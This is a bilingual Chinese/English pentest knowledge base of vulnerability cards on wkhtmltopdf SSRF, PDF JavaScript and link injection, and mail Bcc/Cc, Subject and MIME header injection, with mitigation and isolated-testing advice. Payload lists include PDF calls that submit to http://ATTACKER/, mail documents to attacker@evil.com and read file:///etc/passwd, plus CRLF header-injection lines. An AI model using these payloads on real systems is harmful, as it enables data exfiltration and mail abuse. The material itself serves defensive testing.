title.zh: 为拆分卡建立独立证据
title.en: Build independent evidence for split cards

description.zh: 每个建议目标 ID 单独定义基线、影响验证、修复和回归，避免混合集响应被错误归因。
description.en: Give every proposed target ID its own baseline, impact proof, remediation, and regression to avoid misattributing mixed responses.

review.rationale: 该集合必须拆为 inject2-open-redirect-path-confusion、inject2-cache-deception-extension-confusion、inject2-spring-actuator-endpoint-exposure、inject2-vcs-and-debug-endpoint-exposure 四个主题 ID；它们的解析器、成功证据和缓解措施不同，不能伪装成单卡。

prerequisites.zh: 原混合集的每一行已按调试/VCS 暴露、开放重定向路径混淆、扩展名内容协商和 Spring Actuator 四个独立入口路由。
prerequisites.en: Every line in the mixed collection is routed to one of four distinct entries: debug or VCS exposure, open-redirect path confusion, extension content negotiation, or Spring Actuator.

prerequisites.zh: 每个分支使用独立测试 host/path、身份和日志，只验证无敏感 marker 或 endpoint 元数据，禁止把整套集合一次性扫描。
prerequisites.en: Each branch uses its own test host or path, identity, and logs and validates only nonsensitive markers or endpoint metadata, never scanning the whole collection at once.

analysis.zh: 阳性证据必须按路由目标判定：真实调试/VCS 内容、浏览器外部导航、错误内容协商或未授权 Actuator marker；分支证据不可互换。 假阳性边界：常见路径 200/404、SPA fallback、字符串回显、服务器 banner、静态 favicon、WAF 告警或一个分支成立都不能把整个集合判为同一漏洞。
analysis.en: Positive evidence is route-specific: real debug or VCS content, browser external navigation, incorrect content negotiation, or an unauthorized Actuator marker; evidence cannot be exchanged across branches. False-positive boundary: Common-path HTTP 200 or 404, SPA fallback, reflection, a server banner, static favicon, WAF alert, or success in one branch does not make the entire collection one vulnerability.

opsecTips.zh: 混合集拆分每轮只测试一条路由且低频；出现真实仓库/配置数据、生产调试动作、用户导航、写操作或服务压力时停止。
opsecTips.en: Mixed-set routing tests one branch at low rate per run; stop on real repository or configuration data, production debug actions, user navigation, writes, or service pressure.

opsecTips.zh: 按分支删除 marker、路径请求和临时 endpoint，清理缓存/日志/测试会话，确认四个目标条目无重复或遗漏后回归。
opsecTips.en: Delete branch-specific markers, path requests, and temporary endpoints, clear caches, logs, and test sessions, and regress after confirming no duplicate or missing routes among the four targets.

name.zh: wkhtmltopdf 脚本辅助资源 SSRF

description.zh: 验证 wkhtmltopdf 处理攻击者脚本和资源标签时，是否从服务端访问内网、云元数据或本地文件并写入生成结果。
description.en: Tests whether wkhtmltopdf processes attacker scripts and resource tags to access internal services, cloud metadata, or local files from the server and include results in generated output.

subCategory.zh: 脚本辅助 PDF 渲染 SSRF

overview.zh: 原集合包含 document.write 生成 iframe 以及 img、link、object、embed、video 等直接资源标签。入口看似 XSS，但脚本的作用是构造更多服务器端资源请求，主要影响是渲染器 SSRF 与 file: 读取。
overview.en: The source combines document.write-created iframes with direct img, link, object, embed, video, and related resource elements. Although the syntax resembles XSS, scripting constructs additional server-side resource requests, so the primary impact is renderer SSRF and file access.

vulnerability.zh: 若 wkhtmltopdf 启用 JavaScript 和外部资源加载，且没有逐请求协议与地址校验，不可信 HTML 可在渲染生命周期内动态生成内网请求。脚本执行本身、渲染成功或资源标签出现在 PDF 源中都不证明内部响应可达。
vulnerability.en: If wkhtmltopdf enables JavaScript and external resources without per-request scheme and destination checks, untrusted HTML can generate internal requests dynamically during rendering. Script execution, successful rendering, or resource tags in source do not prove that an internal response was reachable.

exploitation.zh: 步骤一用受控公共图片记录直接标签与 document.write 两条加载路径；步骤二回放原始组合并关联 wkhtmltopdf 网络日志、内部模拟服务、文件 Canary 和 PDF 内容；步骤三分别禁用 JavaScript与外部资源后重放，排除客户端预览、静态标签回显或失败占位符造成的假阳性。
exploitation.en: First use a controlled public image to record direct-tag and document.write loading paths. Replay the original set and correlate wkhtmltopdf network logs, an internal mock service, a file canary, and PDF content. Replay with JavaScript and external resources disabled separately to exclude client previews, static tag echo, or failure placeholders as false positives.

mitigation.zh: 默认禁用不需要的 JavaScript 与本地文件访问；对所有静态和动态资源请求统一实施协议、DNS、重定向和地址 allowlist；在无凭据、受限网络、只读文件系统的独立容器中运行 wkhtmltopdf。
mitigation.en: Disable unneeded JavaScript and local-file access by default. Apply one scheme, DNS, redirect, and destination allowlist to every static and dynamic resource request. Run wkhtmltopdf in a credential-free container with restricted network and a read-only filesystem.

title.zh: 区分静态与动态资源加载
title.en: Separate static and dynamic resource loading

description.zh: 使用受控资源记录直接标签和 document.write 两种路径的渲染器请求特征。
description.en: Use a controlled resource to record renderer request traits for direct tags and document.write paths separately.

description.zh: 回放原始标签与脚本集合，关联内部模拟服务、文件访问和最终 PDF 内容。
description.en: Replay the original tag and script set and correlate internal mock services, file access, and final PDF content.

title.en: Disable dynamic capabilities layer by layer

description.zh: 分别关闭脚本、外部网络和本地文件后重放，确认业务渲染保留且各类内部访问消失。
description.en: Replay after disabling script, external network, and local-file access separately, preserving business rendering while eliminating internal access.

review.rationale: 原集合混合脚本生成与静态标签两条渲染路径，并同时覆盖 HTTP 内部请求与 file URI 本地读取；四种边界需独立验证。

prerequisites.zh: wkhtmltopdf 在服务端启用 JavaScript 或处理动态写入资源标签，且脚本执行、资源加载、网络/文件权限与版本均可观察。
prerequisites.en: Server-side wkhtmltopdf enables JavaScript or processes dynamically written resource tags, with script execution, resource loading, network and file permissions, and version observable.

prerequisites.zh: document.write/资源目标只指向隔离 HTTP marker 或 renderer 沙箱文件，元数据目标禁用；记录 JS console、网络、文件审计和 PDF 产物。
prerequisites.en: document.write and resource targets point only to an isolated HTTP marker or renderer-sandbox file, metadata targets are excluded, and JavaScript console, network, file audit, and PDF artifacts are recorded.

analysis.zh: 阳性证据是 wkhtmltopdf 执行攻击者脚本生成资源节点，随后 renderer 从服务器位置访问 marker 并把特征写入 PDF；脚本与 fetch 两段均需证明。 假阳性边界：静态 img 本身请求、document.write 文本出现、JavaScript 被禁用、PDF 空框、DNS 查询、客户端加载、file URI 错误或只有一个阶段成立都不是脚本辅助链。
analysis.en: Positive evidence requires wkhtmltopdf to execute attacker script that creates a resource node and then fetch the marker from the server position and place its fingerprint in the PDF, proving both script and fetch stages. False-positive boundary: A static img request, document.write text, disabled JavaScript, an empty PDF frame, DNS only, client loading, a file-URI error, or success in only one stage does not prove the script-assisted chain.

opsecTips.zh: 脚本辅助 SSRF 禁止元数据/内网/系统文件和响应外带；出现非隔离请求、认证头、重复脚本、渲染挂起、数据超出 marker 或 worker 压力时停止。
opsecTips.en: Script-assisted SSRF forbids metadata, internal networks, system files, and response exfiltration; stop on nonisolated requests, authentication headers, repeated scripts, render hangs, data beyond the marker, or worker pressure.

opsecTips.zh: 删除 HTML/JS/PDF/marker 与临时目录，关闭 listener，清理 wkhtmltopdf cache/任务/日志并终止 renderer 进程树。
opsecTips.en: Delete HTML, JavaScript, PDF, markers, and temporary directories, close listeners, clear wkhtmltopdf caches, jobs, and logs, and terminate the renderer process tree.

name.zh: PDF JavaScript 活动内容注入

description.zh: 验证攻击者控制的 PDF JavaScript 是否在目标阅读器中调用提交表单、打开文件、导出对象、邮件或其他特权 API。
description.en: Tests whether attacker-controlled PDF JavaScript invokes submit-form, open-file, export-object, mail, or other privileged APIs in the target PDF reader.

overview.zh: 原命令是 PDF 阅读器 JavaScript API 片段，不是浏览器 JavaScript 或 SQL 注入。不同阅读器对 app、this、export 和 mail API 的支持、信任提示及权限完全不同，必须在明确客户端版本和隔离配置中验证。
overview.en: The source contains PDF-reader JavaScript API fragments, not browser JavaScript or SQL injection. Reader support, trust prompts, and permissions for app, this, export, and mail APIs vary widely, so testing requires an identified client version and isolated profile.

vulnerability.zh: 生成服务若把用户脚本嵌入 PDF，或阅读器允许文档脚本调用超出预期的网络、文件和启动 API，打开文件可能产生外部请求、社会工程或本地副作用。脚本存在和弹出提示不等于静默利用，用户交互与沙箱必须记录。
vulnerability.en: If a generation service embeds user script in PDFs, or a reader lets document script call unexpected network, file, or launch APIs, opening the document can create outbound requests, social engineering, or local side effects. Script presence and prompts are not silent exploitation; user interaction and sandbox behavior must be recorded.

exploitation.zh: 步骤一用只写入文档字段的无害脚本确认目标阅读器是否执行 JavaScript；步骤二逐项封装原始 API 调用并在隔离虚拟机记录提示、受控网络、文件和进程事件；步骤三禁用 PDF JavaScript 或受信 API 后复测，排除静态字符串提取、浏览器 PDF 预览差异或用户主动确认造成的假阳性。
exploitation.en: First use a harmless script that writes a document field to confirm JavaScript execution in the target reader. Package each original API call separately and record prompts plus controlled network, file, and process events in an isolated VM. Replay with PDF JavaScript or trusted APIs disabled to exclude static-string extraction, browser-preview differences, or user-confirmed actions as false positives.

mitigation.zh: 生成 PDF 时移除用户控制的 JavaScript、Launch、EmbeddedFile 和自动动作；在企业阅读器策略中禁用不需要的文档脚本和特权 API；对上传与生成文件做结构化解析、内容净化和隔离打开。
mitigation.en: Strip user-controlled JavaScript, Launch, EmbeddedFile, and automatic actions during PDF generation. Disable unnecessary document scripting and privileged APIs through enterprise reader policy. Structurally parse and sanitize uploaded and generated files and open them in isolation.

title.zh: 确认目标阅读器脚本支持

description.zh: 使用无害字段写入脚本记录阅读器版本、JavaScript 开关、信任区和用户提示。
description.en: Use a harmless field-writing script to record reader version, JavaScript setting, trust zone, and user prompts.

title.zh: 隔离调用 PDF 特权 API
title.en: Invoke PDF privileged APIs in isolation

description.zh: 逐项回放原始 API 并关联受控网络、文件、邮件或进程事件，禁止组合执行。
description.en: Replay each original API separately and correlate controlled network, file, mail, or process events without combining calls.

attackChain.payload:
this.submitForm('http://ATTACKER/')
app.alert('XSS')
this.exportDataObject({cName:'exploit.js',nLaunch:2})
app.openDoc('file:///etc/passwd')
app.execMenuItem('Open')
this.exportAsText({cFilename:'file:///etc/passwd'})
app.response('test')
this.mailDoc({cTo:'attacker@evil.com',cSubject:'Exfil',cMsg:'Data'})
this.exportAsFDF({cFilename:'file:///etc/passwd'})
app.plugIns
this.getField('test').value

title.zh: 净化活动 PDF 内容

description.zh: 移除脚本与自动动作后重放，确认文本和表单业务功能保留且特权 API 不再触发。
description.en: Replay after removing scripts and automatic actions to preserve text and form behavior while preventing privileged API triggers.

review.rationale: 载荷面向 PDF 阅读器 JavaScript 与文档特权 API，应从 SQL 注入迁到文件漏洞。

prerequisites.zh: 攻击者可控制 PDF 文档级/注释 JavaScript，目标阅读器版本与 JavaScript、submitForm、exportDataObject、launch 等权限策略已确认。
prerequisites.en: An attacker controls document-level or annotation PDF JavaScript, with target-reader version and policies for JavaScript, submitForm, exportDataObject, launch, and related APIs confirmed.

prerequisites.zh: 在离线 VM 的受控阅读器中把特权 API 替换为只记录固定 marker 的测试 hook，禁用网络、邮件、文件导出和外部程序。
prerequisites.en: An offline VM and controlled reader replace privileged APIs with a test hook recording only a fixed marker while disabling network, mail, file export, and external programs.

analysis.zh: 阳性证据是目标阅读器加载 PDF 后执行嵌入 JavaScript，并调用预期测试 hook 产生 marker；PDF 对象、事件、阅读器日志和版本相互对应。 假阳性边界：PDF 含 /JavaScript、静态扫描告警、脚本源码可提取、阅读器弹出安全提示但未执行、API 被禁用、浏览器 PDF viewer 忽略或手工 console 调用均不是成功利用。
analysis.en: Positive evidence requires the target reader to execute embedded JavaScript after loading the PDF and call the expected test hook to produce a marker, correlating PDF object, event, reader log, and version. False-positive boundary: A /JavaScript object, static scanner alert, extractable source, a security prompt without execution, disabled APIs, browser PDF viewers ignoring code, or manual console calls does not prove successful exploitation.

opsecTips.zh: PDF JavaScript 测试禁止 submitForm 外连、launch、export、邮件和文件访问；出现任何权限提示后继续、外部进程、网络、写入或真实用户文件影响时停止。
opsecTips.en: PDF JavaScript testing forbids submitForm egress, launch, export, mail, and file access; stop on proceeding past a permission prompt, external processes, network, writes, or impact to real user files.

opsecTips.zh: 关闭阅读器并销毁 VM，删除 PDF/marker/最近文件与沙箱产物，清理阅读器缓存/信任设置，恢复测试 hook。
opsecTips.en: Close the reader and destroy the VM, delete PDFs, markers, recent-file state, and sandbox artifacts, clear reader caches and trust settings, and remove test hooks.

name.zh: PDF 链接与 URI 行为注入
name.en: PDF Link and URI Behavior Injection

description.zh: 验证生成 PDF 是否保留攻击者控制的外部、javascript:、file: 或元数据链接，并在阅读器中形成钓鱼或危险协议交互。
description.en: Tests whether generated PDFs preserve attacker-controlled external, javascript, file, or metadata links and create phishing or dangerous-scheme interactions in a reader.

overview.zh: 原内容是进入 PDF 生成流程的 HTML 链接。普通 https 外链需要用户点击，file 与元数据 URL 也通常由客户端阅读器打开，因此不能因为目标是内网就误称服务端 SSRF；只有生成器在构建阶段主动抓取才另行归 SSRF。
overview.en: The source consists of HTML links entering PDF generation. Ordinary HTTPS links require a click, and file or metadata URLs are commonly opened by the client reader, so an internal-looking destination is not automatically server-side SSRF. Renderer retrieval during generation would be a separate SSRF case.

vulnerability.zh: 应用允许不可信文本、显示标签或 URI 直接成为 PDF Link 注释，可能借助可信文档品牌实施钓鱼、危险协议启动或本地文件探测。影响取决于阅读器提示、协议处理器和用户点击，链接存在本身只是内容完整性问题。
vulnerability.en: If an application lets untrusted text, labels, or URIs become PDF Link annotations, a trusted document brand can amplify phishing, dangerous-scheme launch, or local-file probes. Impact depends on reader prompts, protocol handlers, and user clicks; link presence alone is a content-integrity issue.

exploitation.zh: 步骤一生成只含允许站内 https 链接的 PDF 并解析其 Link 注释；步骤二逐项回放原始 URI，在隔离阅读器中记录悬停目标、提示、点击后的实际协议和网络来源；步骤三使用不点击和禁用危险协议的对照，排除生成器仅显示文本、阅读器重写链接或服务端预览请求造成的假阳性。
exploitation.en: First generate a PDF with one allowed internal HTTPS link and parse its Link annotation. Replay each original URI and record hover destination, prompts, actual protocol after clicking, and network origin in an isolated reader. Compare no-click and dangerous-scheme-disabled controls to exclude displayed text, reader rewriting, or server preview requests as false positives.

mitigation.zh: 生成时只允许明确的 http/https 目标并对外链显示真实主机；拒绝 javascript、file 与未知协议，清理自动动作和 Launch；对高信任文档采用链接 allowlist、签名与内容审查，并在支持阅读器中回归。
mitigation.en: Allow only explicit HTTP and HTTPS destinations during generation and display the true host for external links. Reject javascript, file, and unknown schemes and remove automatic actions and Launch. Use link allowlists, signing, and content review for trusted documents and regress supported readers.

title.zh: 解析 PDF Link 注释基线
title.en: Parse the PDF Link annotation baseline

description.zh: 生成允许链接并记录 PDF 结构中的 URI、显示文本、动作类型和阅读器提示。
description.en: Generate an allowed link and record URI, display text, action type, and reader prompts from the PDF structure.

description.zh: 回放原始链接并在隔离阅读器中记录点击前后目标、用户确认和请求实际来源。
description.en: Replay the original links and record pre-click and post-click destinations, user confirmation, and actual request origin in an isolated reader.

attackChain.payload: Click here to verify Click Read Metadata

title.zh: 限制 PDF 链接策略

description.zh: 清理危险协议和自动动作后重放，确认业务 HTTPS 链接保留且客户端危险交互消失。
description.en: Replay after stripping dangerous schemes and automatic actions to preserve business HTTPS links while removing unsafe client interactions.

review.rationale: 四条独立锚点分别测试外部 HTTPS 诱导、PDF JavaScript URI、客户端 file URI 与元数据 HTTP 链接，交互、权限和证据边界不同，需逐 scheme 拆分。

prerequisites.zh: 生成流程允许用户值进入 PDF link annotation 或 URI action，目标阅读器对 https、javascript、file 等 scheme 的提示/阻断策略已确认。
prerequisites.en: A generation flow allows user values into PDF link annotations or URI actions, with target-reader prompt and blocking policies for https, javascript, file, and related schemes confirmed.

prerequisites.zh: 所有外部链接指向自有空页面，危险 scheme 只用无害 marker annotation，在离线 VM 记录 PDF object、点击、提示和最终动作。
prerequisites.en: All external links point to an owned empty page, dangerous schemes use harmless marker annotations only, and an offline VM records PDF objects, clicks, prompts, and final actions.

analysis.zh: 阳性证据是攻击者值被保留为可交互 PDF action，并在一次受控点击后让阅读器执行预期导航/marker；自动执行与需用户确认必须分别说明。 假阳性边界：URI 文本显示、链接对象存在但不可点击、阅读器阻止 scheme、只出现安全提示、静态扫描命中、浏览器 viewer 行为或用户复制地址均不是自动危险动作。
analysis.en: Positive evidence requires the attacker value to remain an interactive PDF action and cause the expected navigation or marker after one controlled click, distinguishing automatic behavior from user-confirmed behavior. False-positive boundary: Displayed URI text, a nonclickable link object, reader scheme blocking, a security prompt only, scanner matches, browser-viewer behavior, or user copying an address does not prove an automatic dangerous action.

opsecTips.zh: PDF 链接测试只导航自有空页，不使用 file/javascript 特权动作或社会工程内容；出现下载、外部程序、真实文件、公共域或非测试用户时停止。
opsecTips.en: PDF link testing navigates only to an owned empty page and uses no privileged file or javascript actions or social-engineering content; stop on downloads, external programs, real files, public origins, or nontest users.

opsecTips.zh: 关闭阅读器/VM，删除 PDF 和目标 token，清理阅读器历史/缓存/最近文件和自有访问日志，并恢复 URI allowlist。
opsecTips.en: Close the reader and VM, delete PDFs and destination tokens, clear reader history, caches, recent-file state, and owned access logs, and restore URI allowlists.

name.zh: 邮件 Bcc/Cc Header 注入
name.en: Email Bcc and Cc Header Injection

description.zh: 验证邮件表单字段中的换行是否突破单一 Header 值并注入额外 Bcc 或 Cc 收件人。
description.en: Tests whether newline characters in mail-form fields escape one header value and inject additional Bcc or Cc recipients.

subCategory.zh: 邮件收件人 Header 注入

overview.zh: 原集合覆盖字面与百分号编码的 LF/CRLF、大小写和多收件人形式，目标 Sink 是应用构造的 RFC 邮件 Header。载荷出现在 HTTP 请求或邮件正文中不算成功，必须在测试 SMTP 信封或邮件 Header 中看到额外收件人。
overview.en: The source covers literal and percent-encoded LF or CRLF, case variants, and multiple recipients targeting application-built mail headers. Appearance in an HTTP request or message body is not success; an extra recipient must appear in the test SMTP envelope or message headers.

vulnerability.zh: 应用把 name、subject、reply-to 等用户字段直接拼进原始邮件头，或重复解码换行时，攻击者可结束当前 Header 并新增 Bcc/Cc。不同邮件库可能自动拒绝换行，因此 500、发送失败或文本回显都不是漏洞证据。
vulnerability.en: If an application concatenates user fields such as name, subject, or reply-to into raw mail headers or decodes newlines repeatedly, an attacker can terminate the current header and add Bcc or Cc. Mail libraries may reject newlines automatically, so a 500, send failure, or text echo is not evidence.

exploitation.zh: 步骤一向隔离 SMTP 捕获器发送正常邮件并记录 envelope recipients 与原始 MIME；步骤二逐项回放原始 Bcc/Cc 变体，保持授权收件人固定并比较捕获结果；步骤三换用结构化邮件 API 后重放，排除捕获器界面折行、正文引用或预配置抄送造成的假阳性。
exploitation.en: First send a normal message to an isolated SMTP catcher and record envelope recipients and raw MIME. Replay each original Bcc and Cc variant while keeping the authorized recipient fixed and compare captured results. Retest with a structured mail API to exclude UI wrapping, body quoting, or preconfigured copies as false positives.

mitigation.zh: 使用邮件库结构化设置 To/Cc/Bcc 而不拼接原始 Header；对所有 Header 字段拒绝解码后 CR/LF 并限制收件人 Schema；将允许收件人从服务端业务对象解析，同时审计异常多收件人与外部域。
mitigation.en: Use structured mail-library methods for To, Cc, and Bcc rather than concatenating raw headers. Reject CR or LF after decoding in every header field and validate recipient schemas. Resolve allowed recipients from server-side business objects and audit unusual recipient counts and external domains.

title.zh: 捕获正常 SMTP 信封

description.zh: 向隔离邮件服务发送基线消息并保存信封收件人、原始 Header 和正文边界。
description.en: Send a baseline message to an isolated mail service and preserve envelope recipients, raw headers, and body boundaries.

title.en: Inject additional Bcc and Cc recipients

description.zh: 回放原始换行变体并比较 SMTP 信封与 MIME Header 中是否出现未授权地址。
description.en: Replay the original newline variants and compare the SMTP envelope and MIME headers for unauthorized addresses.

attackChain.payload:
\nbcc: attacker@evil.com
\r\nbcc: attacker@evil.com
\nBcc: attacker@evil.com
\r\nBcc: attacker@evil.com
\ncc: attacker@evil.com
\r\ncc: attacker@evil.com
\nCc: attacker@evil.com
\r\nCc: attacker@evil.com
%0abcc: attacker@evil.com
%0dBcc: attacker@evil.com
%0d%0abcc: attacker@evil.com
%0d%0aBcc: attacker@evil.com
\nbcc:attacker@evil.com
\r\nbcc:attacker@evil.com
\nbcc: attacker1@evil.com,attacker2@evil.com
\r\nbcc: attacker1@evil.com,attacker2@evil.com
%0abcc: attacker1@evil.com,attacker2@evil.com
%0d%0abcc: attacker1@evil.com,attacker2@evil.com
\nbcc: attacker@evil.com\ncc: attacker2@evil.com
\r\nbcc: attacker@evil.com\r\ncc: attacker2@evil.com

description.zh: 使用类型化收件人 API 和换行拒绝后重放，确认正常抄送可用且注入地址消失。
description.en: Replay after typed recipient APIs and newline rejection to preserve legitimate copies while removing injected addresses.

review.rationale: 换行后的 Bcc/Cc 进入邮件 Header 与 SMTP 信封，属于邮件 Header 注入而非 SQL/NoSQL。

prerequisites.zh: 用户邮件字段在解码后直接进入单个 RFC 5322 Header 值，应用/邮件库未拒绝 CR/LF，最终原始 MIME 与 SMTP envelope 可观察。
prerequisites.en: A decoded user mail field enters one RFC 5322 header value without CR or LF rejection, and final raw MIME plus SMTP envelope are observable.

prerequisites.zh: 使用隔离 SMTP sink、测试域和专用收件箱，注入地址为无投递 marker mailbox，保存应用参数、raw message、envelope recipients 和队列 ID。
prerequisites.en: An isolated SMTP sink, test domain, and dedicated mailboxes use a nondelivering marker recipient, preserving application parameter, raw message, envelope recipients, and queue identifier.

analysis.zh: 阳性证据是换行突破原 Header 值并在最终 MIME 创建独立 Bcc/Cc，且 SMTP envelope/隔离 sink 包含新增 marker 收件人。 假阳性边界：输入字符串含 bcc、Header 在 UI/日志中换行、邮件库折叠为同一值、raw MIME 无新字段、只改显示头但 envelope 未新增、sink 自动抄送均不是注入。
analysis.en: Positive evidence requires the newline to escape the original header value and create a distinct Bcc or Cc in final MIME, with the added marker recipient present in the SMTP envelope or isolated sink. False-positive boundary: A bcc substring, line breaks in UI or logs, library folding into one value, no new field in raw MIME, display-header changes without a new envelope recipient, or sink-side auto-copy does not prove injection.

opsecTips.zh: Bcc/Cc 注入只使用隔离不投递地址且一封邮件；出现真实收件人、外部域投递、队列重试、退信、通知或多封发送时停止。
opsecTips.en: Bcc or Cc injection uses one isolated nondelivering address and one message; stop on real recipients, external-domain delivery, queue retries, bounces, notifications, or multiple sends.

opsecTips.zh: 删除隔离邮件/队列/marker 收件箱，清理应用和 SMTP 日志，关闭 sink，恢复 CRLF 校验并重放正常多收件人流程。
opsecTips.en: Delete isolated messages, queues, and marker mailboxes, clear application and SMTP logs, close the sink, restore CRLF validation, and replay normal multi-recipient flows.

name.zh: 邮件 Subject Header 注入

description.zh: 验证邮件字段中的换行是否新增或覆盖 Subject 及自定义 Header，并改变最终 MIME Header 结构。
description.en: Tests whether newlines in mail fields add or override Subject and custom headers and alter the final MIME header structure.

subCategory.zh: 邮件主题 Header 注入

overview.zh: 原命令使用 LF、CRLF 与百分号编码插入第二个 Subject 或 X-Injected Header。主题显示变化可能受到邮件客户端折叠和重复 Header 策略影响，审计必须查看 SMTP 捕获器保存的原始 MIME，而不是只看 UI。
overview.en: The source uses LF, CRLF, and percent encoding to insert a second Subject or X-Injected header. Display changes depend on client folding and duplicate-header policy, so review must inspect raw MIME from an SMTP catcher rather than only the UI.

vulnerability.zh: 应用把联系人姓名、反馈标题等不可信值拼接到 Subject Header，且未在最终解码后拒绝换行时，攻击者可改变邮件元数据并为后续钓鱼或 Header 注入创造条件。重复 Subject 被客户端忽略也不等于输入安全。
vulnerability.en: If an application concatenates untrusted names or feedback titles into Subject without rejecting newlines after final decoding, an attacker can alter message metadata and enable phishing or further header injection. A client ignoring duplicate Subject does not mean the input path is safe.

exploitation.zh: 步骤一发送包含唯一正常主题的消息并保存原始 MIME；步骤二逐项回放原始 Subject/X-Injected 变体，比较折叠前 Header 数量、顺序和值；步骤三用不同客户端显示与结构化邮件 API 对照，排除 UI 折行、RFC 编码字换行或正文出现 Subject 字样造成的假阳性。
exploitation.en: First send a message with a unique normal subject and preserve raw MIME. Replay each original Subject and X-Injected variant and compare header count, order, and values before folding. Compare several client displays and a structured mail API to exclude UI wrapping, encoded-word folding, or Subject text in the body as false positives.

mitigation.zh: 通过邮件库 Subject 属性设置主题而非拼接 MIME；在所有邮件 Header 输入上拒绝 CR/LF、控制字符和重复解码结果；限制长度与字符集，并在出站网关记录重复或异常 Header。
mitigation.en: Set the subject through the mail library property rather than concatenating MIME. Reject CR, LF, control characters, and repeated-decoding results in every mail-header input. Limit length and character set and log duplicate or anomalous headers at the outbound gateway.

title.zh: 保存唯一主题 MIME 基线

description.zh: 向隔离 SMTP 服务发送正常主题并保存折叠前后的完整原始 Header。
description.en: Send a normal unique subject to an isolated SMTP service and preserve complete raw headers before and after folding.

description.zh: 回放原始换行与编码变体并比较 Subject 数量、X-Injected 值和客户端显示。
description.en: Replay the original newline and encoded variants and compare Subject count, X-Injected values, and client display.

attackChain.payload:
\nSubject: Injected Subject
\r\nSubject: Injected Subject
%0aSubject: Injected Subject
%0d%0aSubject: Injected Subject
\nSubject: spam message
\r\nSubject: spam message
%0aSubject: spam message
%0d%0aSubject: spam message
\nX-Injected: true
\r\nX-Injected: true

description.zh: 切换结构化 Subject 设置并拒绝控制字符后重放，确认合法 Unicode 主题保留且新 Header 无法生成。
description.en: Replay after structured Subject assignment and control-character rejection to preserve valid Unicode subjects while preventing new headers.

review.rationale: 实际 Sink 是 MIME Subject/Header 构造，应从 SQL 注入纠正为邮件 Header 注入。

prerequisites.zh: 可控主题或相邻字段未经换行校验进入邮件 Header serializer，编码词、折行和下游 MTA 重写后的原始 MIME 可获取。
prerequisites.en: A controlled subject or adjacent field enters a mail header serializer without newline validation, with encoded-word, folding, and downstream MTA-rewritten raw MIME available.

prerequisites.zh: 隔离 SMTP sink 使用唯一 X-Test-Subject marker，保存提交值、应用生成 Header、MTA 后 raw message 和队列 ID，不发送外部邮件。
prerequisites.en: An isolated SMTP sink uses a unique X-Test-Subject marker and preserves submitted value, application-generated headers, post-MTA raw message, and queue identifier without external delivery.

analysis.zh: 阳性证据是可控 CR/LF 在最终 MIME 中结束原 Subject 并创建/覆盖新的独立 Subject 或测试 Header，raw message 与输入对应。 假阳性边界：邮件客户端视觉换行、RFC 合法折行、主题显示截断、encoded-word 解码、日志多行、第二 Subject 被 MTA 丢弃或仅请求参数变化均不是有效注入。
analysis.en: Positive evidence requires controlled CR or LF to terminate the original Subject and create or override a distinct Subject or test header in final MIME, with raw message tied to input. False-positive boundary: Visual wrapping in a mail client, legal RFC folding, truncated display, encoded-word decoding, multiline logs, a second Subject dropped by the MTA, or request-only changes does not prove injection.

opsecTips.zh: Subject 测试只注入 X-Test 标头且单封隔离邮件；出现真实 Header 覆盖、外部投递、垃圾邮件规则、队列重试或通知时停止。
opsecTips.en: Subject testing injects an X-Test header in one isolated message only; stop on real-header override, external delivery, spam-rule effects, queue retries, or notifications.

opsecTips.zh: 删除 sink 邮件/队列/marker，清理客户端缓存和应用/MTA 日志，恢复 Header 库换行拒绝并回归 Unicode 主题。
opsecTips.en: Delete sink messages, queues, and markers, clear client caches and application or MTA logs, restore newline rejection in the header library, and regress Unicode subjects.

name.zh: 邮件 MIME Content-Type Header 注入

description.zh: 验证用户输入中的换行是否注入 Content-Type、MIME-Version 或 Content-Transfer-Encoding 并改变邮件正文解释。
description.en: Tests whether newlines in user input inject Content-Type, MIME-Version, or Content-Transfer-Encoding headers and change interpretation of the message body.

subCategory.zh: MIME 结构 Header 注入

overview.zh: 原集合面向邮件 MIME 头而非 HTTP Content-Type，包含 multipart boundary、text/html、MIME-Version 和传输编码。成功需要最终邮件的 Header/正文边界发生变化，并被目标客户端按注入类型解析。
overview.en: The source targets mail MIME headers rather than HTTP Content-Type and includes multipart boundaries, text/html, MIME-Version, and transfer encoding. Success requires the final message's header or body boundary to change and the target client to parse the injected type.

vulnerability.zh: 应用把用户字段拼进原始邮件 Header，允许 CR/LF 结束上一字段后，攻击者可重定义 MIME 结构、隐藏正文或引入活动 HTML。邮件库可能重写、去重或拒绝这些头，因此仅发送成功不证明注入。
vulnerability.en: When an application concatenates user fields into raw mail headers and permits CR or LF to end a field, an attacker can redefine MIME structure, hide body parts, or introduce active HTML. Mail libraries may rewrite, deduplicate, or reject these headers, so successful sending alone is not proof.

exploitation.zh: 步骤一发送正常 text/plain 邮件并保存原始 Header、boundary 与客户端渲染；步骤二逐项回放原始 MIME Header 变体，在 SMTP 捕获器解析部件树并比较目标客户端显示；步骤三使用邮件库结构化内容 API 对照，排除捕获器自动补头、客户端 HTML 偏好或正文字符串造成的假阳性。
exploitation.en: First send a normal text/plain message and preserve raw headers, boundaries, and client rendering. Replay each original MIME-header variant, parse the part tree at an SMTP catcher, and compare target-client display. Compare a structured mail-content API to exclude catcher-added headers, client HTML preferences, or body strings as false positives.

mitigation.zh: 通过邮件库的 multipart、正文和附件 API 构建 MIME，不接受用户提供原始结构头；拒绝 Header 输入中的 CR/LF 与控制字符；固定允许的内容类型、边界生成和传输编码，并在网关验证 MIME 树。
mitigation.en: Build MIME through mail-library multipart, body, and attachment APIs and never accept raw structural headers from users. Reject CR, LF, and controls in header input. Pin allowed content types, generated boundaries, and transfer encodings and validate the MIME tree at the gateway.

title.zh: 记录正常 MIME 部件树
title.en: Record the normal MIME part tree

description.zh: 发送 text/plain 基线并保存原始 Header、boundary、编码和客户端渲染结果。
description.en: Send a text/plain baseline and preserve raw headers, boundary, encoding, and client rendering.

title.zh: 注入 MIME 结构 Header

description.zh: 回放原始 Content-Type/MIME 变体并比较捕获器部件树与实际客户端解释。
description.en: Replay the original Content-Type and MIME variants and compare the catcher part tree with actual client interpretation.

attackChain.payload:
\nContent-Type: multipart/mixed; boundary=INJECTED
\r\nContent-Type: multipart/mixed; boundary=INJECTED
%0aContent-Type: multipart/mixed; boundary=INJECTED
%0d%0aContent-Type: multipart/mixed; boundary=INJECTED
\nContent-Type: text/html
\r\nContent-Type: text/html
%0aContent-Type: text/html
%0d%0aContent-Type: text/html
\nMIME-Version: 1.0
\r\nMIME-Version: 1.0
\nContent-Transfer-Encoding: base64
\r\nContent-Transfer-Encoding: base64

title.zh: 改用类型化 MIME 构造

description.zh: 通过结构化 API 生成正文和附件后重放，确认合法 multipart 可用且用户无法新增结构头。
